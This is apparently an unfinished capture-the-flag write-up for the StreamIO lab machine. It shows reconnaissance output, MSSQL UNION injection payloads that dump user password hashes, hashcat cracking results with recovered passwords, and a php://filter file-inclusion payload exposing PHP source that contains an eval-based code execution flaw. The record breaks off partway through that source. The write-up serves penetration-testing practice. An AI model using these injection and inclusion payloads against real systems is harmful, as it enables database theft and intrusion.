
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sV -sC streamio.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-30 09:30 EDT
Nmap scan report for streamio.htb (10.129.151.80)
Host is up (0.029s latency).
Not shown: 986 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-30 20:30:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Streamio
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2026-09-30T20:31:29+00:00; +7h00m02s from scanner time.
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-30T20:30:51
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.17 seconds

```

### Service Enumeration

```
gobuster dir -u https://watch.streamio.htb -w  /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -k -x .php

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 400) [Size: 3420]
/index.php            (Status: 200) [Size: 2829]
/search.php           (Status: 200) [Size: 253887]
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/Search.php           (Status: 200) [Size: 253887]
/Index.php            (Status: 200) [Size: 2829]
/INDEX.php            (Status: 200) [Size: 2829]
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/SEARCH.php           (Status: 200) [Size: 253887]
/blocked.php          (Status: 200) [Size: 677]
/Static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/Static/]
Progress: 110910 / 175324 (63.26%)[ERROR] error on word charts_e.php: timeout occurred during the request
[ERROR] error on word charts_e: timeout occurred during the request
[ERROR] error on word charts_d: timeout occurred during the request
[ERROR] error on word charts_c.php: timeout occurred during the request
[ERROR] error on word charts_a.php: timeout occurred during the request
[ERROR] error on word charts_a: timeout occurred during the request
[ERROR] error on word charts_c: timeout occurred during the request
[ERROR] error on word charts_b.php: timeout occurred during the request
[ERROR] error on word charts_d.php: timeout occurred during the request
[ERROR] error on word charts_b: timeout occurred during the request
Progress: 111300 / 175324 (63.48%)[ERROR] error on word lda_intro: timeout occurred during the request
[ERROR] error on word harcerstwo: timeout occurred during the request
[ERROR] error on word harcerstwo.php: timeout occurred during the request
Progress: 112062 / 175324 (63.92%)[ERROR] error on word 29632: timeout occurred during the request
Progress: 112175 / 175324 (63.98%)[ERROR] error on word regioportal.php: timeout occurred during the request
Progress: 112290 / 175324 (64.05%)[ERROR] error on word 11588: timeout occurred during the request
[ERROR] error on word 11580.php: timeout occurred during the request
Progress: 175324 / 175324 (100.00%)
===============================================================
Finished
===============================================================
                                                                              
```

navingating to /search.php discloses a database of movies.

```
 cat search.txt
POST /search.php HTTP/2
Host: watch.streamio.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Origin: https://watch.streamio.htb
Referer: https://watch.streamio.htb/search.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

q=test

```

```
sqlmap -r search.txt --schema --force-ssl
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
|_ -| . ["]     | .'| . |                                                                                                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:44:02 /2026-10-01/

[13:44:02] [INFO] parsing HTTP request from 'search.txt'
[13:44:02] [INFO] testing connection to the target URL
[13:44:08] [INFO] testing if the target URL content is stable
[13:44:08] [INFO] target URL content is stable
[13:44:08] [INFO] testing if POST parameter 'q' is dynamic
[13:44:08] [INFO] POST parameter 'q' appears to be dynamic
[13:44:08] [WARNING] heuristic (basic) test shows that POST parameter 'q' might not be injectable
[13:44:08] [INFO] testing for SQL injection on POST parameter 'q'
[13:44:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
got a 302 redirect to 'https://watch.streamio.htb/blocked.php'. Do you want to follow? [Y/n] n
[13:44:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:44:13] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:44:13] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:44:14] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[13:44:15] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[13:44:16] [INFO] testing 'Generic inline queries'
[13:44:16] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:44:17] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[13:44:17] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[13:44:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:44:19] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[13:44:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[13:44:21] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
[13:44:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:44:34] [WARNING] POST parameter 'q' does not seem to be injectable
[13:44:34] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[13:44:34] [WARNING] your sqlmap version is outdated

[*] ending @ 13:44:34 /2026-10-01/


```

```
' UNION SELECT 1,@@version,3,4,5,6-- 
```

```
' UNION SELECT 1,DB_NAME(),3,4,5,6--
```

```
' UNION SELECT 1,(SELECT STRING_AGG(name, ',') FROM sys.tables),3,4,5,6--
```

```
' UNION SELECT 1,(SELECT STRING_AGG(name, ',') FROM sys.columns WHERE object_id = OBJECT_ID('users')),3,4,5,6--
```

```
' UNION SELECT 1,(SELECT STRING_AGG(CONCAT(id,':',username,':',password,':',is_staff), ' | ') FROM users),3,4,5,6--
```

users:

```
##### 3:James :c660060492d9edcaa8332d89c99c9239 :1 | 4:Theodore :925e5408ecb67aea449373d668b7359e :1 | 5:Samantha :083ffae904143c4796e464dac33c1f7d :1 | 6:Lauren :08344b85b329d7efd611b7a7743e8a09 :1 | 7:William :d62be0dc82071bccc1322d64ec5b6c51 :1 | 8:Sabrina :f87d3c0d6c8fd686aacc6627f1f493a5 :1 | 9:Robert :f03b910e2bd0313a23fdd7575f34a694 :1 | 10:Thane :3577c47eb1e12c8ba021611e1280753c :1 | 11:Carmon :35394484d89fcfdb3c5e447fe749d213 :1 | 12:Barry :54c88b2dbd7b1a84012fabc1a4c73415 :1 | 13:Oliver :fd78db29173a5cf701bd69027cb9bf6b :1 | 14:Michelle :b83439b16f844bd6ffe35c02fe21b3c0 :1 | 15:Gloria :0cfaaaafb559f081df2befbe66686de0 :1 | 16:Victoria :b22abb47a02b52d5dfa27fb0b534f693 :1 | 17:Alexendra :1c2b3d8270321140e5153f6637d3ee53 :1 | 18:Baxter :22ee218331afd081b0dcd8115284bae3 :1 | 19:Clara :ef8f3d30a856cf166fb8215aca93e9ff :1 | 20:Barbra :3961548825e3e21df5646cafe11c6c76 :1 | 21:Lenord :ee0b8a0937abd60c2882eacb2f8dc49f :1 | 22:Austin :0049ac57646627b8d7aeaccf8b6a936f :1 | 23:Garfield :8097cedd612cc37c29db152b6e9edbd3 :1 | 24:Juliette :6dcd87740abb64edfa36d170f0d5450d :1 | 25:Victor :bf55e15b119860a6e6b5a164377da719 :1 | 26:Lucifer :7df45a9e3de3863807c026ba48e55fb3 :1 | 27:Bruno :2a4e2cf22dd8fcb45adcb91be1e22ae8 :1 | 28:Diablo :ec33265e5fc8c2f1b0c137bb7b3632b5 :1 | 29:Robin :dc332fb5576e9631c9dae83f194f8e70 :1 | 30:Stan :384463526d288edcc95fc3701e523bc7 :1 | 31:yoshihide :b779ba15cedfd22a023c4d8bcf5f2332 :1 | 33:admin :665a50ac9eaa781e4f7f04199db97a11 :0
```

cracking the hashes:

```
 hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt     
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1469/2939 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 30 digests; 30 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1915 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

3577c47eb1e12c8ba021611e1280753c:highschoolmusical        
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i               
665a50ac9eaa781e4f7f04199db97a11:paddpadd                 
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
ef8f3d30a856cf166fb8215aca93e9ff:%$clara                  
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$           
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW                   
6dcd87740abb64edfa36d170f0d5450d:$3xybitch                
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123              
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!               
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$               
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hashes.txt
Time.Started.....: Thu Oct  1 14:55:30 2026 (2 secs)
Time.Estimated...: Thu Oct  1 14:55:32 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  6160.3 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 12/30 (40.00%) Digests (total), 12/30 (40.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 42%

Started: Thu Oct  1 14:55:28 2026
Stopped: Thu Oct  1 14:55:34 2026

```

https://streamio.htb/login.php is accessible with creds 

| 66boysandgirls.. (pw) | **yoshihide** (user) |
| --------------------- | -------------------- |

```
 gobuster dir -u https://streamio.htb -w  /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -k

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 400) [Size: 3420]
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/Images               (Status: 301) [Size: 151] [--> https://streamio.htb/Images/]
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]
/fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/fonts/]
/IMAGES               (Status: 301) [Size: 151] [--> https://streamio.htb/IMAGES/]
/Fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/Fonts/]
/Admin                (Status: 301) [Size: 150] [--> https://streamio.htb/Admin/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 148] [--> https://streamio.htb/CSS/]
/JS                   (Status: 301) [Size: 147] [--> https://streamio.htb/JS/]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]

```

```
gobuster dir -u https://streamio.htb/admin -w  /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -k -x .php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/admin
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 400) [Size: 3420]
/index.php            (Status: 403) [Size: 18]
/images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/images/]
/Images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/Images/]
/css                  (Status: 301) [Size: 154] [--> https://streamio.htb/admin/css/]
/Index.php            (Status: 403) [Size: 18]
/js                   (Status: 301) [Size: 153] [--> https://streamio.htb/admin/js/]
/master.php           (Status: 200) [Size: 58]
/fonts                (Status: 301) [Size: 156] [--> https://streamio.htb/admin/fonts/]
/IMAGES               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/IMAGES/]
/INDEX.php            (Status: 403) [Size: 18]
/Fonts                (Status: 301) [Size: 156] [--> https://streamio.htb/admin/Fonts/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 154] [--> https://streamio.htb/admin/CSS/]
/JS                   (Status: 301) [Size: 153] [--> https://streamio.htb/admin/JS/]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/Master.php           (Status: 200) [Size: 58]
/MASTER.php           (Status: 200) [Size: 58]
Progress: 106262 / 175324 (60.61%)[ERROR] error on word ASCIIPR0N: timeout occurred during the request
[ERROR] error on word afinger.php: timeout occurred during the request
[ERROR] error on word ASCIIPR0N.php: timeout occurred during the request
Progress: 167518 / 175324 (95.55%)[ERROR] error on word 145231: timeout occurred during the request
[ERROR] error on word 145231.php: timeout occurred during the request
Progress: 167747 / 175324 (95.68%)[ERROR] error on word cctld.php: timeout occurred during the request
[ERROR] error on word cctld: timeout occurred during the request
[ERROR] error on word rddn: timeout occurred during the request
[ERROR] error on word rddn.php: timeout occurred during the request
[ERROR] error on word KDDpapers: timeout occurred during the request
[ERROR] error on word %7Ecook.php: timeout occurred during the request
[ERROR] error on word cata.php: timeout occurred during the request
Progress: 167969 / 175324 (95.80%)[ERROR] error on word %7Egreg.php: timeout occurred during the request
Progress: 175324 / 175324 (100.00%)
===============================================================
Finished

```

```
curl -k https://streamio.htb/admin/master.php
<h1>Movie managment</h1>
Only accessable through includes  
```

```
ffuf -w /home/kali/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ' -fs 1678 -b PHPSESSID=or28o8t43he0anuu96rf7fqjn6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/?FUZZ
 :: Wordlist         : FUZZ: /home/kali/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Cookie: PHPSESSID=or28o8t43he0anuu96rf7fqjn6
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1678
________________________________________________

debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 39ms]
movie                   [Status: 200, Size: 319875, Words: 15967, Lines: 10779, Duration: 46ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 217ms]
user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 54ms]
:: Progress: [6453/6453] :: Job [1/1] :: 80 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
```

img php wrapper

```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

```
PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==
```

```
base64 -d master.b64
```

master.php:

```
<h1>Movie managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['movie']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST" action="?movie=">
                                <input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
